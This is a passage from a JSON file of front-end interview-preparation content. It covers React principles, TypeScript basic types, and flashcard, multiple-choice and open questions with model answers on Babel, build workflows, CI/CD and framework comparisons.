HTML on the server, sending fully-formed pages to the browser, which is beneficial for SEO, faster initial page loads, and improved user experience.\n\n5.  **Hierarchical Component Structure**: React applications naturally form a hierarchical tree of components. Components that appear visually nested in the UI design are represented as parent-child relationships in the code. This intuitive structure mirrors the UI, making it easier to reason about the application's layout, data flow, and interactions. A parent component can pass data (props) to its child components, and children can communicate back to parents via callbacks.\n\n6.  **Rich Tool Ecosystem**: React benefits from a vast and constantly evolving ecosystem of development tools, libraries, and extensions. This includes official tools like Create React App (for quick project setup), React DevTools (for debugging), and popular third-party libraries for state management (Redux, Zustand, Recoil), routing (React Router), styling (Styled Components, Emotion), form handling (Formik, React Hook Form), and more. This rich ecosystem provides solutions for almost every development challenge.\n\n7.  **High Cohesion, Loose Coupling**: React components are designed to have **high cohesion** internally, meaning all related logic, markup (JSX), and styling for a specific part of the UI are encapsulated within that component. They are also **loosely coupled** with other components, meaning they interact with each other through well-defined interfaces (props and state) with minimal direct dependencies. This promotes modularity, testability, and easier maintenance, as changes in one component are less likely to break others.\n\n8.  **JSX (JavaScript XML)**: JSX is a syntax extension for JavaScript recommended by React. It allows developers to write HTML-like markup directly within their JavaScript code. This combines the markup (structure) and logic (behavior) of a component into the same file, making components self-contained, highly readable, and easier to understand by showing exactly how the UI will look with given data. While not mandatory, JSX is widely adopted due to its expressive power and development efficiency.",
          "examples": [
            {
              "id": "example_react_component",
              "title": "Reusable React Component (JSX & Props)",
              "code": "import React from 'react';\n\nfunction Button({ onClick, label, type = 'button' }) {\n  return (\n    <button type={type} onClick={onClick} className=\"my-button\">\n      {label}\n    </button>\n  );\n}\n\nfunction App() {\n  const handleClick = () => {\n    alert('Button clicked!');\n  };\n\n  return (\n    <div>\n      <h1>React Component Example</h1>\n      <Button onClick={handleClick} label=\"Click Me!\" />\n      <Button type=\"submit\" label=\"Submit Form\" />\n      <Button label=\"Disabled Button\" disabled={true} />\n    </div>\n  );\n}\n\nexport default App;",
              "explanation": "This example demonstrates several key React principles: reusable components, one-way data flow via props, and JSX. The `Button` component is designed to be highly reusable, accepting `onClick`, `label`, and `type` as props. It encapsulates its own rendering logic. The `App` component then composes multiple instances of the `Button` component, passing different props to each, showcasing how data flows unidirectionally from parent to child.",
              "language": "jsx"
            },
            {
              "id": "example_virtual_dom_concept",
              "title": "Virtual DOM Concept (Simplified)",
              "code": "// --- Initial Render (Simplified) ---\nconst initialVirtualDOM = { type: 'div', props: null, children: ['Hello'] };\n// React renders this to actual DOM\ndocument.getElementById('root').innerHTML = '<div>Hello</div>';\n\n// --- State Update (Simplified) ---\nconst updatedVirtualDOM = { type: 'div', props: null, children: ['Hello World'] };\n\n// React's diffing algorithm compares initialVirtualDOM and updatedVirtualDOM\n// It finds that 'Hello' changed to 'Hello World'\n\n// --- Actual DOM Update (Simplified) ---\n// Only the text content is updated, not the entire div element\ndocument.getElementById('root').firstChild.textContent = 'Hello World';\n\n// In a real React app, this would be handled internally:\n// ReactDOM.render(<App />, document.getElementById('root'));\n// setState triggers re-render, Virtual DOM diffs, then real DOM update.",
              "explanation": "This simplified conceptual example illustrates the Virtual DOM process. Initially, React creates a Virtual DOM representation of the UI and renders it to the Real DOM. When the application's state changes, React creates a *new* Virtual DOM tree. Instead of directly manipulating the Real DOM, it performs a 'diffing' process between the old and new Virtual DOMs. It then calculates the most efficient way to update the Real DOM, applying only the minimal necessary changes. This batching of updates and intelligent diffing is what makes React highly performant, avoiding costly full re-renders of the DOM.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_why_react_1",
            "question_why_react_2",
            "question_why_react_3",
            "question_why_react_4",
            "question_why_react_5"
          ],
          "relatedTasks": [
            "task_react_component_hierarchy"
          ],
          "tags": [
            "React",
            "Virtual DOM",
            "Component-based",
            "JSX",
            "One-way Data Flow",
            "SEO",
            "Frontend Architecture"
          ],
          "technology": "React",
          "prerequisites": [
            "javascript_basics",
            "dom_manipulation",
            "html_css_basics"
          ],
          "complexity": 7,
          "interviewRelevance": 10,
          "learningPath": "intermediate",
          "requiredFor": [
            "react_development",
            "frontend_architecture_design",
            "performance_optimization"
          ]
        },
        {
          "id": "theory_typescript_basic_types",
          "title": "TypeScript: Basic Types",
          "content": "## Introduction to TypeScript Basic Types\nTypeScript extends JavaScript by adding static type definitions. This means you can specify the type of variables, function parameters, and return values, allowing for early error detection during development (before runtime) and improved code readability and maintainability. Understanding basic types is fundamental to writing effective TypeScript code.\n\n### 1. Primitives\nThese are the fundamental building blocks of data types in JavaScript, and TypeScript provides specific types for them:\n*   **`boolean`**: Represents a true/false value.\n    ```typescript\n    let isDone: boolean = false;\n    isDone = true;\n    // isDone = 1; // Error: Type '1' is not assignable to type 'boolean'.\n    ```\n*   **`number`**: Represents both integer and floating-point numbers. Unlike some other languages, TypeScript does not have separate types for integers and floats.\n    ```typescript\n    let decimal: number = 6;\n    let hex: number = 0xf00d;\n    let binary: number = 0b1010;\n    let octal: number = 0o744;\n    // decimal = \"hello\"; // Error: Type 'string' is not assignable to type 'number'.\n    ```\n*   **`string`**: Represents textual data. You can use single quotes, double quotes, or backticks (for template strings).\n    ```typescript\n    let color: string = \"blue\";\n    color = 'red';\n    let greeting: string = `Hello, ${color}!`;\n    // color = true; // Error: Type 'boolean' is not assignable to type 'string'.\n    ```\n\n### 2. Arrays\nTypeScript allows you to specify the type of elements an array can hold. There are two common ways to declare array types:\n*   **Type followed by `[]`**: This is the most common and readable way.\n    ```typescript\n    let list: number[] = [1, 2, 3];\n    // list.push(\"4\"); // Error: Argument of type 'string' is not assignable to parameter of type 'number'.\n    ```\n*   **Generic Array Type (`Array<elemType>`)**: Using the generic `Array` type.\n    ```typescript\n    let list2: Array<string> = [\"a\", \"b\", \"c\"];\n    // list2.push(1); // Error: Argument of type 'number' is not assignable to parameter of type 'string'.\n    ```\n\n### 3. Tuple\nA tuple type allows you to express an array with a fixed number of elements whose types are known, but don't have to be the same. The order of types in the tuple declaration matters.\n*   **Usage**: Useful for representing a record with a fixed structure where each position has a specific meaning.\n    ```typescript\n    // Declare a tuple type\n    let x: [string, number];\n    // Initialize it\n    x = [\"hello\", 10]; // OK\n    // x = [10, \"hello\"]; // Error: Type 'number' is not assignable to type 'string'. Type 'string' is not assignable to type 'number'.\n    // x[0] = 5; // Error: Type 'number' is not assignable to type 'string'.\n    \n    // Accessing elements\n    console.log(x[0].substring(1)); // 'ello'\n    // console.log(x[1].substring(1)); // Error: Property 'substring' does not exist on type 'number'.\n    \n    // Tuples can also have optional elements and rest elements in more advanced scenarios.\n    ```\n\n### 4. Enum\nEnums (enumerations) are a feature in TypeScript that allows you to define a set of named constants. They make it easier to work with a set of distinct values.\n*   **Numeric Enums (default)**: By default, enums are numeric, starting with `0`.\n    ```typescript\n    enum Color { Red, Green, Blue }\n    let c: Color = Color.Green; // c is 1\n    console.log(c); // Output: 1\n\n    enum Status { Success = 200, NotFound = 404, ServerError = 500 }\n    let s: Status = Status.NotFound; // s is 404\n    console.log(Status.Success); // Output: 200\n    ```\n*   **String Enums**: You can also define enums with string values.\n    ```typescript\n    enum Direction { Up = \"UP\", Down = \"DOWN\", Left = \"LEFT\", Right = \"RIGHT\" }\n    let move: Direction = Direction.Up;\n    console.log(move); // Output: \"UP\"\n    ```\n\n### 5. Any\nThe `any` type is a powerful way to work with existing JavaScript code, as well as code from 3rd party libraries, without spending too much time providing type definitions. It allows you to opt-out of type checking for a specific variable. However, it should be used sparingly as it defeats the purpose of TypeScript's type safety.\n*   **Usage**: When the type is unknown, or when you need to store values of different types.\n    ```typescript\n    let notSure: any = 4;\n    notSure = \"maybe a string instead\";\n    notSure = false; // OK, can be a boolean\n\n    let looselyTyped: any = {};\n    looselyTyped.a = 1;\n    looselyTyped.b(); // No error at compile time, but will crash at runtime if 'b' is not a function\n    ```\n*   **When to use `any`**: When migrating a JavaScript project to TypeScript, for variables whose type truly changes during runtime, or for accepting user input that can be of various types before validation.\n\n### 6. Void, Null, Undefined, Never\nWhile not explicitly in the provided markdown, these are also basic types.\n*   **`void`**: The absence of any type. Commonly used as the return type of functions that do not return a value.\n    ```typescript\n    function warnUser(): void {\n      console.log(\"This is my warning message\");\n    }\n    ```\n*   **`null` and `undefined`**: Represent `null` and `undefined` values. By default, `null` and `undefined` are subtypes of all other types (e.g., `number`, `string`). However, with the `--strictNullChecks` flag, they can only be assigned to their own types or to `void`.\n    ```typescript\n    let u: undefined = undefined;\n    let n: null = null;\n    ```\n*   **`never`**: Represents the type of values that never occur. Used for functions that throw exceptions or functions that never return (e.g., infinite loops).\n    ```typescript\n    function error(message: string): never {\n      throw new Error(message);\n    }\n    ```\n",
          "examples": [
            {
              "id": "example_typescript_enums",
              "title": "Using TypeScript Enums and Tuples",
              "code": "enum UserRole {\n  ADMIN = \"ADMIN\",\n  EDITOR = \"EDITOR\",\n  VIEWER = \"VIEWER\",\n}\n\n// A tuple to store user information: [id, name, role]\ntype UserInfoTuple = [number, string, UserRole];\n\nfunction processUser(user: UserInfoTuple): string {\n  const [id, name, role] = user;\n  if (role === UserRole.ADMIN) {\n    return `Admin User: ${name} (ID: ${id})`;\n  } else if (role === UserRole.EDITOR) {\n    return `Editor User: ${name} (ID: ${id})`;\n  } else {\n    return `Viewer User: ${name} (ID: ${id})`;\n  }\n}\n\nconst adminUser: UserInfoTuple = [101, \"Alice\", UserRole.ADMIN];\nconst editorUser: UserInfoTuple = [202, \"Bob\", UserRole.EDITOR];\nconst viewerUser: UserInfoTuple = [303, \"Charlie\", UserRole.VIEWER];\n\nconsole.log(processUser(adminUser));\nconsole.log(processUser(editorUser));\nconsole.log(processUser(viewerUser));\n\n// Example of array of a specific type\nconst userIds: number[] = [1, 5, 9, 13];\nuserIds.forEach(id => console.log(`User ID: ${id}`));",
              "explanation": "This example demonstrates the practical use of TypeScript enums and tuples. `UserRole` is a string enum, providing readable named constants for user roles. `UserInfoTuple` defines a tuple type with a fixed structure for `[id (number), name (string), role (UserRole)]`. The `processUser` function correctly types its input as `UserInfoTuple` and uses the enum values for comparison, enhancing type safety and code clarity. It also shows a simple number array.",
              "language": "typescript"
            },
            {
              "id": "example_typescript_any",
              "title": "Practical Use and Pitfalls of 'any' type",
              "code": "function parseInput(input: any): any {\n  if (typeof input === 'string') {\n    try {\n      return JSON.parse(input);\n    } catch (e) {\n      console.error(\"Could not parse JSON string\");\n      return null; // Return null if parsing fails\n    }\n  } else if (typeof input === 'number') {\n    return input * 2;\n  } else if (typeof input === 'boolean') {\n    return !input;\n  }\n  return undefined; // Default return for unhandled types\n}\n\nlet unknownData: any = \"{\\\"name\\\": \\\"Alice\\\", \\\"age\\\": 30}\";\nlet processedData = parseInput(unknownData);\nconsole.log(processedData); // Output: { name: 'Alice', age: 30 }\n\nunknownData = 10;\nprocessedData = parseInput(unknownData);\nconsole.log(processedData); // Output: 20\n\nunknownData = true;\nprocessedData = parseInput(unknownData);\nconsole.log(processedData); // Output: false\n\n// Pitfall: 'any' allows invalid calls at compile time\nlet riskyVariable: any = \"hello\";\n// riskyVariable.map(); // No compile-time error, but will crash at runtime\n",
              "explanation": "This example showcases `any` in a scenario where input type is truly dynamic, like a `parseInput` function that might handle various data formats. The function accepts and returns `any` because it processes different types of input into different types of output. This allows flexibility but also demonstrates the pitfall: `riskyVariable.map()` would cause a runtime error because `map` is not a method on a string, but TypeScript with `any` won't catch this at compile time. This highlights why `any` should be used cautiously and with clear justification.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_typescript_basics_1",
            "question_typescript_basics_2",
            "question_typescript_basics_3",
            "question_typescript_basics_4",
            "question_typescript_basics_5",
            "question_typescript_basics_6"
          ],
          "relatedTasks": [
            "task_typescript_basic_types"
          ],
          "tags": [
            "TypeScript",
            "Basic Types",
            "Type Safety",
            "Enums",
            "Tuples",
            "Any",
            "Primitives"
          ],
          "technology": "TypeScript",
          "prerequisites": [
            "javascript_basics"
          ],
          "complexity": 5,
          "interviewRelevance": 8,
          "learningPath": "beginner",
          "requiredFor": [
            "typescript_development",
            "type_script_advanced_types",
            "react_with_typescript"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_transpilers_babel_1",
          "topic": "Transpilers and Babel",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary purpose of a transpiler like Babel in modern JavaScript development?",
          "answer": "To convert next-generation JavaScript (ES6+) into backward-compatible JavaScript that can run in older environments.",
          "options": [],
          "analysisPoints": [
            "Identifies the core function of Babel.",
            "Distinguishes between transpilation and compilation.",
            "Highlights the compatibility issue it solves."
          ],
          "keyConcepts": [
            "Transpiler",
            "Babel",
            "ES6+",
            "Backward Compatibility"
          ],
          "evaluationCriteria": [
            "Ability to define 'transpiler'.",
            "Understanding of Babel's role.",
            "Knowledge of target environments."
          ],
          "example": null,
          "tags": [
            "Babel",
            "Transpilation",
            "ES6"
          ],
          "prerequisites": [
            "javascript_basics"
          ],
          "complexity": 2,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_transpilers_babel_2",
          "topic": "Transpilers and Babel Configuration",
          "level": "medium",
          "type": "mcq",
          "question": "Given the following `babel.config.js` snippet, what is the main purpose of `@babel/preset-env` and its `targets` option?",
          "answer": "It transpiles JavaScript code based on specified target environments, ensuring compatibility with those browsers or Node.js versions.",
          "options": [
            "It bundles all JavaScript files into a single output file.",
            "It transpiles JavaScript code based on specified target environments, ensuring compatibility with those browsers or Node.js versions.",
            "It automatically adds polyfills for all new JavaScript features regardless of browser support.",
            "It minifies the JavaScript code to reduce file size."
          ],
          "analysisPoints": [
            "Tests understanding of Babel presets vs. plugins.",
            "Focuses on the `preset-env`'s role in environment-specific transpilation.",
            "Distinguishes transpilation from bundling, polyfilling (without targets), and minification."
          ],
          "keyConcepts": [
            "Babel Presets",
            "babel/preset-env",
            "Targets",
            "Compatibility"
          ],
          "evaluationCriteria": [
            "Correctly identifies the function of `preset-env`.",
            "Understands the significance of `targets` option.",
            "Differentiates between core Babel functions and other build steps."
          ],
          "example": "```javascript\n// babel.config.js\nmodule.exports = {\n  presets: [\n    ['@babel/preset-env', {\n      targets: {\n        browsers: ['> 1%', 'last 2 versions']\n      }\n    }]\n  ],\n  plugins: []\n};\n```",
          "tags": [
            "Babel",
            "Configuration",
            "Preset-Env",
            "Transpilation"
          ],
          "prerequisites": [
            "babel_basics",
            "es6_features"
          ],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_transpilers_babel_3",
          "topic": "Babel Configuration",
          "level": "hard",
          "type": "code",
          "question": "You are working on a project that needs to support both modern browsers (last 2 versions) and IE11 for a specific set of users. You also want to use ES2022 features like class properties. Write the `babel.config.js` file that achieves this, ensuring you only transpile what's necessary and include polyfills efficiently. Assume you have `core-js` installed.",
          "answer": "```javascript\nmodule.exports = {\n  presets: [\n    ['@babel/preset-env', {\n      targets: {\n        browsers: ['last 2 versions', 'ie >= 11', 'not dead']\n      },\n      useBuiltIns: 'usage',\n      corejs: 3\n    }]\n  ],\n  plugins: [\n    '@babel/plugin-proposal-class-properties',\n    '@babel/plugin-transform-runtime' // Recommended to avoid helper duplication\n  ]\n};\n```",
          "options": [],
          "analysisPoints": [
            "Correctly uses `@babel/preset-env` to specify browser targets.",
            "Includes IE11 in the `targets` configuration.",
            "Applies `useBuiltIns: 'usage'` and `corejs: 3` for efficient polyfilling.",
            "Adds `@babel/plugin-proposal-class-properties` for class properties.",
            "Considered adding `@babel/plugin-transform-runtime` for optimization."
          ],
          "keyConcepts": [
            "Babel Configuration",
            "Preset-Env Targets",
            "Polyfills",
            "Class Properties",
            "Optimization"
          ],
          "evaluationCriteria": [
            "Accuracy of Babel configuration syntax.",
            "Effective use of `targets` for diverse browser support.",
            "Proper polyfill setup with `useBuiltIns` and `corejs`.",
            "Inclusion of relevant plugins for advanced features.",
            "Demonstrates understanding of efficient transpilation practices."
          ],
          "example": null,
          "tags": [
            "Babel",
            "Configuration",
            "Advanced",
            "Polyfill",
            "ES2022"
          ],
          "prerequisites": [
            "babel_basics",
            "es6_features",
            "javascript_modules"
          ],
          "complexity": 8,
          "interviewFrequency": 6,
          "learningPath": "advanced"
        },
        {
          "id": "question_transpilers_babel_4",
          "topic": "Transpilers vs. Compilers",
          "level": "easy",
          "type": "open",
          "question": "What is the fundamental difference between a transpiler and a traditional compiler, in the context of JavaScript?",
          "answer": "A transpiler (like Babel) converts source code from one high-level language version (e.g., ES6+) to another high-level language version (e.g., ES5). A traditional compiler converts source code from a high-level language (e.g., C++, Java) into a lower-level language or machine code (e.g., assembly, bytecode) that can be directly executed by a machine or runtime environment.",
          "options": [],
          "analysisPoints": [
            "Defines transpiler as source-to-source translation.",
            "Defines compiler as high-level to low-level/machine code translation.",
            "Provides context specific to JavaScript for transpilers."
          ],
          "keyConcepts": [
            "Transpiler",
            "Compiler",
            "Source Code",
            "Machine Code"
          ],
          "evaluationCriteria": [
            "Clear definition of both terms.",
            "Accurate distinction between their outputs.",
            "Relevance to JavaScript context."
          ],
          "example": null,
          "tags": [
            "Transpilation",
            "Compilation",
            "Fundamentals"
          ],
          "prerequisites": [
            "programming_fundamentals"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_transpilers_babel_5",
          "topic": "Babel Plugins",
          "level": "medium",
          "type": "flashcard",
          "question": "In Babel, what is the role of a 'plugin' compared to a 'preset'?",
          "answer": "A plugin handles a specific language feature transformation (e.g., arrow functions). A preset is a collection of pre-configured plugins and options designed for a specific environment or set of features (e.g., `@babel/preset-env` for ES6+).",
          "options": [],
          "analysisPoints": [
            "Defines plugin as atomic transformation.",
            "Defines preset as a group of plugins/options.",
            "Illustrates with an example for each."
          ],
          "keyConcepts": [
            "Babel Plugins",
            "Babel Presets",
            "Configuration"
          ],
          "evaluationCriteria": [
            "Ability to differentiate plugin and preset.",
            "Understanding of their respective granularities.",
            "Knowledge of configuration structure."
          ],
          "example": null,
          "tags": [
            "Babel",
            "Configuration",
            "Plugins",
            "Presets"
          ],
          "prerequisites": [
            "babel_basics"
          ],
          "complexity": 4,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_modern_dev_workflow_1",
          "topic": "Modern Development Workflow",
          "level": "easy",
          "type": "flashcard",
          "question": "What are npm and Yarn primarily used for in a modern frontend workflow?",
          "answer": "Dependency management and project initialization.",
          "options": [],
          "analysisPoints": [
            "Identifies the core functions of package managers.",
            "Highlights their role in setting up and maintaining projects."
          ],
          "keyConcepts": [
            "npm",
            "Yarn",
            "Dependency Management",
            "Project Initialization"
          ],
          "evaluationCriteria": [
            "Basic understanding of package managers.",
            "Recognition of their primary uses."
          ],
          "example": null,
          "tags": [
            "Workflow",
            "Package Manager",
            "npm",
            "Yarn"
          ],
          "prerequisites": [
            "javascript_basics"
          ],
          "complexity": 2,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_modern_dev_workflow_2",
          "topic": "Build Process",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following tasks is NOT typically performed by a module bundler like Webpack in a modern frontend build process?",
          "answer": "Automated deployment to a production server.",
          "options": [
            "Module bundling (combining multiple JS files).",
            "Transpilation of ES6+ to ES5.",
            "Minification of JavaScript and CSS files.",
            "Automated deployment to a production server."
          ],
          "analysisPoints": [
            "Tests understanding of core module bundler functionalities.",
            "Distinguishes between bundling/transpilation/minification and deployment.",
            "Identifies CI/CD as a separate stage."
          ],
          "keyConcepts": [
            "Webpack",
            "Module Bundling",
            "Transpilation",
            "Minification",
            "CI/CD"
          ],
          "evaluationCriteria": [
            "Correctly identifies the scope of module bundlers.",
            "Differentiates between build process and deployment phases.",
            "Knowledge of various build optimization techniques."
          ],
          "example": null,
          "tags": [
            "Webpack",
            "Build Tools",
            "Optimization",
            "Deployment"
          ],
          "prerequisites": [
            "webpack_basics"
          ],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_modern_dev_workflow_3",
          "topic": "Code Quality and Testing",
          "level": "medium",
          "type": "open",
          "question": "Explain the roles of linting and automated testing in a modern frontend development workflow. How do they contribute to code quality?",
          "answer": "Linting (e.g., ESLint) involves static analysis of source code to identify programmatic errors, stylistic inconsistencies, and suspicious constructs. It helps enforce coding standards, improve readability, and prevent common mistakes before runtime. Automated testing (e.g., Jest, Mocha, Cypress) involves writing code to verify the functionality of the application automatically. Unit tests check individual functions/components, integration tests verify interactions between parts, and end-to-end tests simulate user flows. Together, they contribute to code quality by catching bugs early, ensuring new features don't break existing ones (regression prevention), making refactoring safer, and providing confidence in the codebase's correctness and maintainability.",
          "options": [],
          "analysisPoints": [
            "Defines linting and its benefits (style, errors, consistency).",
            "Defines automated testing (unit, integration, E2E) and its benefits (bug prevention, regression, refactoring safety).",
            "Connects both practices to overall code quality and maintainability."
          ],
          "keyConcepts": [
            "Linting",
            "ESLint",
            "Automated Testing",
            "Unit Testing",
            "Integration Testing",
            "E2E Testing",
            "Code Quality"
          ],
          "evaluationCriteria": [
            "Clear definitions of linting and testing.",
            "Accurate description of their purposes.",
            "Ability to articulate their combined impact on quality.",
            "Mention of specific tools is a plus."
          ],
          "example": null,
          "tags": [
            "Code Quality",
            "Linting",
            "Testing",
            "ESLint",
            "Jest"
          ],
          "prerequisites": [
            "javascript_basics",
            "software_testing_principles"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_modern_dev_workflow_4",
          "topic": "Development Server Features",
          "level": "easy",
          "type": "flashcard",
          "question": "What is Hot Module Replacement (HMR) and why is it beneficial during frontend development?",
          "answer": "Hot Module Replacement (HMR) is a feature of development servers that allows modules (like components or styles) to be updated in a running application without a full page reload. It's beneficial because it preserves the application's state, leading to faster development cycles and a smoother developer experience.",
          "options": [],
          "analysisPoints": [
            "Defines HMR as updating modules without full reload.",
            "Highlights state preservation and faster cycles as benefits."
          ],
          "keyConcepts": [
            "HMR",
            "Development Server",
            "Developer Experience"
          ],
          "evaluationCriteria": [
            "Correct definition of HMR.",
            "Understanding of its practical advantages."
          ],
          "example": null,
          "tags": [
            "DevTools",
            "HMR",
            "Webpack Dev Server"
          ],
          "prerequisites": [
            "web_development_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_modern_dev_workflow_5",
          "topic": "CI/CD",
          "level": "medium",
          "type": "open",
          "question": "Briefly explain what CI/CD stands for and its importance in a modern software development pipeline.",
          "answer": "CI/CD stands for Continuous Integration / Continuous Deployment (or Delivery). It's a set of practices that enable rapid and reliable software releases. **Continuous Integration (CI)** means developers frequently merge their code changes into a central repository, where automated builds and tests are run to detect integration issues early. **Continuous Deployment (CD)** (or Delivery) means that after successful integration and testing, changes are automatically deployed to production environments (or made ready for manual deployment in Continuous Delivery). Its importance lies in: \n1.  **Faster Release Cycles**: Automates the delivery process, enabling more frequent releases. \n2.  **Early Bug Detection**: Issues are caught and resolved quickly due to frequent integration and testing. \n3.  **Improved Code Quality**: Automated tests and builds ensure consistency and reduce manual errors. \n4.  **Reduced Risk**: Smaller, more frequent deployments are less risky than large, infrequent ones. \n5.  **Better Collaboration**: Encourages frequent code merging and immediate feedback.",
          "options": [],
          "analysisPoints": [
            "Correctly spells out CI/CD.",
            "Explains Continuous Integration (frequent merges, automated build/test).",
            "Explains Continuous Deployment (automatic deployment post-CI).",
            "Articulates key benefits (speed, quality, risk reduction, collaboration)."
          ],
          "keyConcepts": [
            "CI/CD",
            "Continuous Integration",
            "Continuous Deployment",
            "Automation",
            "Software Delivery"
          ],
          "evaluationCriteria": [
            "Accurate definitions of CI and CD.",
            "Comprehensive explanation of their importance.",
            "Understanding of the benefits they bring to development."
          ],
          "example": null,
          "tags": [
            "CI/CD",
            "DevOps",
            "Automation",
            "Deployment"
          ],
          "prerequisites": [
            "software_development_lifecycle"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_framework_comparison_1",
          "topic": "JavaScript Framework Comparison",
          "level": "easy",
          "type": "flashcard",
          "question": "Which of React, Angular, and Vue is generally considered a 'full framework' offering a complete solution out-of-the-box?",
          "answer": "Angular",
          "options": [],
          "analysisPoints": [
            "Tests basic classification of frameworks vs. libraries.",
            "Confirms knowledge of Angular's comprehensive nature."
          ],
          "keyConcepts": [
            "Angular",
            "Full Framework",
            "Framework Types"
          ],
          "evaluationCriteria": [
            "Correct identification of Angular's type.",
            "Basic understanding of framework classifications."
          ],
          "example": null,
          "tags": [
            "Angular",
            "Framework",
            "Comparison"
          ],
          "prerequisites": [
            "frontend_frameworks_overview"
          ],
          "complexity": 2,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_framework_comparison_2",
          "topic": "Data Binding",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following statements about data binding in React, Angular, and Vue:\n\nI. React primarily uses one-way data flow.\nII. Angular typically uses two-way data binding.\nIII. Vue only supports one-way data flow, similar to React.\n\nWhich of the statements are TRUE?",
          "answer": "I and II only",
          "options": [
            "I only",
            "II only",
            "I and II only",
            "I, II, and III"
          ],
          "analysisPoints": [
            "Confirms understanding of data flow mechanisms in each framework.",
            "Distinguishes Vue's optional two-way binding from React's strict one-way."
          ],
          "keyConcepts": [
            "Data Binding",
            "One-way Data Flow",
            "Two-way Data Binding",
            "React",
            "Angular",
            "Vue"
          ],
          "evaluationCriteria": [
            "Accurate knowledge of data binding in React.",
            "Accurate knowledge of data binding in Angular.",
            "Correctly identifies Vue's flexible data binding as optional two-way."
          ],
          "example": null,
          "tags": [
            "Data Flow",
            "React",
            "Angular",
            "Vue",
            "Comparison"
          ],
          "prerequisites": [
            "frontend_frameworks_overview"
          ],
          "complexity": 6,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_framework_comparison_3",
          "topic": "DOM Interaction",
          "level": "medium",
          "type": "open",
          "question": "Compare and contrast how React and Angular handle updates to the DOM. Discuss the concept of Virtual DOM.",
          "answer": "**React (Virtual DOM):**\nReact uses a Virtual DOM, which is a lightweight JavaScript representation of the actual DOM. When state changes, React first updates this Virtual DOM. It then efficiently compares the new Virtual DOM with the previous one (a process called 'diffing') to identify the minimal set of changes needed. Finally, it batches these changes and applies only the necessary updates to the real DOM. This minimizes direct, expensive DOM manipulations, leading to faster and more efficient UI updates.\n\n**Angular (Real DOM with Change Detection):**\nAngular directly interacts with the Real DOM. It uses its own change detection mechanism (often powered by Zone.js in older versions, Ivy's tree-shakable approach in newer versions) to detect when data models change. When a change is detected, Angular traverses the component tree to identify which components' views need to be re-rendered and then updates the corresponding parts of the Real DOM directly. While it doesn't use a Virtual DOM, its change detection is highly optimized and can be configured (e.g., OnPush strategy) to be very performant, but it can be more complex to optimize manually compared to React's automatic Virtual DOM diffing for complex scenarios.",
          "options": [],
          "analysisPoints": [
            "Explains Virtual DOM in React (in-memory representation, diffing, batching).",
            "Explains Angular's approach (direct DOM, change detection mechanism).",
            "Highlights the performance implications and differences in approach."
          ],
          "keyConcepts": [
            "Virtual DOM",
            "Real DOM",
            "Change Detection",
            "React",
            "Angular",
            "DOM Manipulation"
          ],
          "evaluationCriteria": [
            "Clear and accurate explanation of Virtual DOM.",
            "Accurate description of Angular's change detection.",
            "Ability to compare their approaches effectively.",
            "Understanding of performance implications."
          ],
          "example": null,
          "tags": [
            "Virtual DOM",
            "DOM",
            "Performance",
            "React",
            "Angular"
          ],
          "prerequisites": [
            "dom_manipulation",
            "javascript_performance"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_framework_comparison_4",
          "topic": "Framework Characteristics",
          "level": "easy",
          "type": "flashcard",
          "question": "Which framework is known for its 'progressive' nature, allowing it to be incrementally adopted into existing projects?",
          "answer": "Vue",
          "options": [],
          "analysisPoints": [
            "Tests recall of a key Vue characteristic.",
            "Highlights its flexibility for various project sizes."
          ],
          "keyConcepts": [
            "Vue",
            "Progressive Framework",
            "Incremental Adoption"
          ],
          "evaluationCriteria": [
            "Correct identification of Vue's characteristic.",
            "Understanding of 'progressive framework' concept."
          ],
          "example": null,
          "tags": [
            "Vue",
            "Framework",
            "Flexibility"
          ],
          "prerequisites": [
            "frontend_frameworks_overview"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_framework_comparison_5",
          "topic": "Framework Choice",
          "level": "hard",
          "type": "open",
          "question": "You are leading a new frontend project for an enterprise application. The team consists of experienced JavaScript developers, some of whom are familiar with React, others with Angular, and a few with Vue. The project requires high consistency, scalability, and long-term maintainability. Which framework would you lean towards and why, considering the team's background and project requirements?",
          "answer": "For an enterprise application requiring high consistency, scalability, and long-term maintainability, with a mixed team background, I would lean towards **Angular**.\n\n**Justification:**\n\n1.  **Opinionated Full Framework**: Angular provides a comprehensive, opinionated structure and a full suite of tools (routing, state management, HTTP client, CLI). This enforces consistency across a large codebase and helps onboard new developers more easily, even if they're not familiar with Angular, because there's a clear 'Angular Way' to do things. This is critical for long-term maintainability and scalability in enterprise environments.\n2.  **TypeScript Integration**: Angular is built with TypeScript, which provides strong typing, leading to fewer runtime errors, better code completion, and easier refactoring—all crucial for large, complex applications and collaborative teams.\n3.  **Scalability & Maintainability**: Its module-based architecture, dependency injection, and clear separation of concerns (components, services, directives) promote highly scalable and maintainable applications. It's designed for large teams and complex projects.\n4.  **Corporate Support (Google)**: Google's strong backing ensures continuous development, stability, and a reliable ecosystem, which is important for enterprise applications with long lifecycles.\n5.  **Steep Learning Curve Mitigation**: While Angular has a steeper learning curve, the benefit of consistency and maintainability often outweighs this for enterprise projects. The team's mixed background means some will adapt quickly, and the 